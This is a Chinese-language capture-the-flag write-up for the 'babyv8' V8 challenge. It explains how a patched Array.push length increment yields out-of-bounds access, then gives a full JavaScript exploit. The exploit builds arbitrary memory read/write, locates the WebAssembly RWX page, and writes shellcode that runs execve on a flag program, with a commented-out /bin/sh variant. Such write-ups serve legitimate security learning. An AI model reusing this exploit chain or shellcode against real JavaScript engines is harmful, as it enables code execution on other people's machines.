# babyv8 wp

这是一道非常简单的v8 pwn，patch只有一行，在CodeStubAssembler::BuildAppendJSArray中可以看到Increment(&var_length);变成了Increment(&var_length, 3);所以在arr.push操作的时候length会+3，所以可以构造oob，但是如果在length>elements length的时候会触发array的fix，会增加element的长度。

稍微了解一下v8的数据结构的内存布局就可以发现在没有进行gc的时候elements是在array object的低地址处，所以这个oob刚好可以修改array object的length和elements addr，这样可以构造在特定区域的任意地址读写（因为8.0后是Pointer Compression），然后通过内存布局修改dataview的backingstore来构造任意地址读写，最后在wasm的rwx段写shellcode就行，因为远程没给交互，所以需要shellcode执行flag_printer。

总而言之这是个非常简单的v8题目，如果没接触过的新人我也预计的是4-6个小时就可以做出来，只需要学习v8的object在内存的布局就行。

下面是我都exp：

```javascript
class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    d2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2d(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
    hex(val){
        return val.toString(16).padStart(16, "0");
    }
}
var mem = new Memory();

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var f = wasmInstance.exports.main;

var a1 = [1.1, 2.2, 3.3];
var a = [1.1, 2.2, 3.3];
var b = [f,f];
var buf = new ArrayBuffer(0x200);
var dv = new DataView(buf);
a1.pop();
a1.push(3.3);
a1_addr = mem.d2u(a1[4]) & 0xFFFFFFFF;
a1[4] = mem.u2d(0x10000000000+a1_addr);

function leak32(addr, offset=0){
    a1[0xa] = mem.u2d(0x10000000000+addr);
    //print('0x' + mem.d2u(a[offset]).toString(16));
    return (mem.d2u(a[offset]) - (mem.d2u(a[offset]) & 0xFFFFFFFF)) / 0x100000000;
}

function leak64(addr, offset=0){
    a1[0xa] = mem.u2d(0x10000000000+addr);
    //print('0x' + mem.d2u(a[offset]).toString(16));
    return mem.d2u(a[offset]);
}

a.pop(); 
//%SystemBreak();
a.push(3.3);
print('0x'+ mem.d2u(a[4]).toString(16));
elements_addr = mem.d2u(a[4]) & 0xFFFFFFFF;
print('elements addr: 0x' + elements_addr.toString(16));
a[4] = mem.u2d(0x10000000000+elements_addr);

func_addr = (mem.d2u(a[0x6]) - (mem.d2u(a[0x6]) & 0xFFFFFFFF)) / 0x100000000;
print('func_addr: 0x'+ func_addr.toString(16));
backing_store = mem.d2u(a[0x14])
print('backing store: 0x'+ backing_store.toString(16));
print('backing store(): 0x'+ (backing_store * 0x1000).toString(16));


//%SystemBreak();  
//leak rwx
//function_addr->shared_info_addr->WasmExportedFunctionData->instance_addr->rwx_addr
shared_info_addr = leak32(func_addr);
print('shared_info_addr: 0x' + shared_info_addr.toString(16));
WasmExportedFunctionData = leak32(shared_info_addr-0x20, 3);
print('WasmExportedFunctionData: 0x' + WasmExportedFunctionData.toString(16));
instance_addr = leak32(WasmExportedFunctionData-0x4);
print('instance_addr: 0x' + instance_addr.toString(16));
rwx_addr = leak64(instance_addr+0x60);
print('rwx_addr: 0x' + rwx_addr.toString(16));

//write backing store
a1[0xa] = mem.u2d(0x10000000000+elements_addr+4);
a[0xb] = mem.u2d(rwx_addr);
//let sc = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];
let sc = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 115, 104, 111, 117, 100, 115, 1, 1, 72, 49, 4, 36, 72, 184, 46, 47, 102, 108, 97, 103, 95, 112, 80, 72, 137, 231, 49, 210, 49, 246, 106, 59, 88, 15, 5]
for(var i = 0; i<sc.length; i++){
    dv.setUint8(i, sc[i], true);
}
f();
//%SystemBreak();
```

